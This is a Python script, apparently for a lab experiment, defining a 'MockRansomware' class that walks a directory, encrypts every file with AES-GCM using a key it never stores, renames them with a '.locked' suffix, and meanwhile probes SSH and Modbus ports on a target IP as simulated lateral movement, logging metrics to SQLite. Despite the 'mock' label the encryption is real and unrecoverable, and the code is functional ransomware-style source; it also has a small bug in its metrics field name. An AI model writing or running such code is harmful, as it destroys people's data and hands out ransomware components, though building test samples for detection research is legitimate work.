import os
import time
import asyncio
import sqlite3
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class MockRansomware:
    def __init__(self, target_dir: str, target_ip: str) -> None:
        self.target_dir = Path(target_dir)
        self.target_ip = target_ip
        self.key = AESGCM.generate_key(bit_length=256)
        self.aesgcm = AESGCM(self.key)
        self.encrypted_count = 0
        self.net_attempts = 0
        self.db_path = "attack_metrics.db"
        self._init_db()

    def _init_db(self):
        with sqlite3.connect(self.db_path) as db_conn:
            db_conn.execute("""CREATE TABLE IF NOT EXISTS metrics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    encrypted_files INTEGER,
                    network_attempts INTEGER,
                    elapsed_time REAL
                )
            """)

    def encrypt_files(self, file_path: Path):
        try:
            data = file_path.read_bytes()
            nonce = os.urandom(12)
            cipher_text = self.aesgcm.encrypt(nonce, data, None)

            file_path.write_bytes(nonce + cipher_text)
            file_path.rename(file_path.with_suffix(file_path.suffix + ".locked"))

            self.encrypted_count += 1
        except (PermissionError, FileNotFoundError):
            pass

    async def encrypt_routine(self):
        loop = asyncio.get_running_loop()

        for root, _, files in os.walk(self.target_dir):
            for file in files:
                if not file.endswith(".locked"):
                    file_path = Path(root) / file
                    await loop.run_in_executor(None, self.encrypt_files,file_path)
                    await asyncio.sleep(0.02)

    async def lateral_mov_routine(self, ports: list[int]):
        while True:
            for port in ports:
                try:
                    reader, writer = await asyncio.wait_for(
                            asyncio.open_connection(self.target_ip, port),
                            timeout=0.5
                    )
                    self.net_attempts += 1
                    writer.close()
                    await writer.wait_closed()
                except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                    self.net_attempts += 1
            await asyncio.sleep(0.1)

    def save_metrics(self, elapsed_time: float):
        with sqlite3.connect(self.db_path) as db_conn:
            db_conn.execute(
                    "INSERT INTO metrics (encrypted_files, network_attempts, elapsed_time) VALUES (?, ?, ?)",
                (self.encrypted_count, self.network_attempts, elapsed_time)
                )

    async def execute(self):
        start_time = time.time()

        encryption_task = asyncio.create_task(self.encrypt_routine())
        lateral_mov_routine = asyncio.create_task(self.lateral_mov_routine(ports=[22, 502]))
        
        await encryption_task
        lateral_mov_routine.cancel()

        elapsed_time = time.time() - start_time
        self.save_metrics(elapsed_time)

if __name__ == "__main__":
    DIR_TO_ATTACK = "./files_to_encrypt"
    TARGET_IP = "192.168.20.3" # IP hipotetico da VM-03

    Path(DIR_TO_ATTACK).mkdir(exist_ok=True)

    ransomware = MockRansomware(target_dir=DIR_TO_ATTACK, target_ip=TARGET_IP)

    try:
        asyncio.run(ransomware.execute())
    except KeyboardInterrupt:
        print("Execução interrompida manualmente.")
